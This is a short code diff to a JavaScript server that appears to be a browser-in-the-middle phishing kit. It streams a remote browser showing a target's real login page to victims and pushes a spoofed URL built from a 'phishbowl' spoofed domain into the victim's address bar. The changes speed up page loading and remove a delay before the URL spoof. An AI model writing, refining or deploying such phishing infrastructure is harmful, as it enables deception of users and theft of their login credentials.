@@ -320,7 +320,7 @@ async function get_browser(target_page){
     delete browsers[index]
     console.log('killed browser')
   }
-  await browser.target_page.goto(target_page, {waitUntil: 'networkidle2'})
+  await browser.target_page.goto(target_page, {waitUntil: 'domcontentloaded'})
   browser.broadcast_page = await browser.newPage()
   browser.broadcast_page.goto(`http://localhost:58082/broadcast?id=${browser_id}`)
   return browser
@@ -393,11 +393,8 @@ fastify.ready(async function(err){
       const targetPageUrl = new URL(target.login_page)
       const initialSpoofedUrl = `https://${empty_phishbowl.spoofed_domain}${targetPageUrl.pathname}${targetPageUrl.search}${targetPageUrl.hash}`
       
-      // Add small delay to ensure client-side JS is ready
-      setTimeout(() => {
-        console.log(`Spoofing URL to: ${initialSpoofedUrl}`)
-        fastify.io.to(socket.id).emit('push_state', initialSpoofedUrl)
-      }, 2000)
+      console.log(`Spoofing URL to: ${initialSpoofedUrl}`)
+      fastify.io.to(socket.id).emit('push_state', initialSpoofedUrl)
       
       fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
       //console.log(empty_phishbowl)
